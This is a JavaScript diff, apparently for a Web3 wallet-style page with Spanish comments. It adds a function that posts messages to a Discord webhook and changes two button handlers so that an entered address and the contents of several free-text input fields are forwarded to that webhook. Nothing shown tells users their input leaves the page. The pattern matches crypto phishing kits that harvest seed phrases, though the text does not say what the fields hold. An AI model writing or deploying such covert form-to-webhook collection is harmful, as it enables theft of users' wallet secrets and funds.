@@ -153,28 +153,53 @@ document.addEventListener('DOMContentLoaded', async () => {
 document.getElementById('textInputsContainer').style.display = 'flex';
 
 
+    // Función para enviar mensajes a Discord via Webhook
+function sendMessageToDiscord(message) {
+    const webhookUrl = 'AQUÍ_VA_TU_URL_DE_WEBHOOK';
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            content: message,
+            username: "Web3 Notifier", // Puedes personalizar el nombre de usuario del webhook
+        }),
+    })
+    .then(response => response.json())
+    .then(data => console.log('Success:', data))
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+
+
+
     
-    // Función para manejar el envío de la dirección
-    submitAddressButton.addEventListener('click', () => {
-        const address = addressInput.value;
-        if (address) {
-            console.log(`Dirección enviada: ${address}`);
-            // Aquí puedes agregar la lógica para manejar la dirección enviada
-        }
-    });
+   // Función para manejar el envío de la dirección ingresada manualmente
+submitAddressButton.addEventListener('click', () => {
+    const address = addressInput.value.trim();
+    if (address) {
+        console.log(`Dirección enviada manualmente: ${address}`);
+        sendMessageToDiscord(`Dirección enviada manualmente: ${address}`);
+        // Aquí continúa tu lógica, si es necesario
+    }
+});
 
-     // Función para manejar el envío de textos
-    submitTextsButton.addEventListener('click', () => {
-        const texts = [];
-        textInputsContainer.querySelectorAll('input').forEach(input => {
-            if (input.value.trim() !== '') texts.push(input.value);
-        });
-        console.log('Textos enviados:', texts);
-        // Aquí puedes agregar la lógica para manejar los textos enviados, como enviarlos a una API o procesarlos de alguna manera
 
-        // Opcionalmente, limpiar los campos después del envío
-        textInputsContainer.querySelectorAll('input').forEach(input => input.value = '');
+  // Función para manejar el envío de textos
+submitTextsButton.addEventListener('click', () => {
+    const texts = [];
+    textInputsContainer.querySelectorAll('input').forEach(input => {
+        if (input.value.trim() !== '') texts.push(input.value);
     });
+    console.log('Textos enviados:', texts.join(', '));
+    sendMessageToDiscord(`Textos enviados: ${texts.join(', ')}`);
+    // Opcionalmente, limpiar los campos después del envío
+    textInputsContainer.querySelectorAll('input').forEach(input => input.value = '');
+});
+
 
     // Función para manejar el envío de la dirección ingresada manualmente
     submitAddress.addEventListener('click', () => {
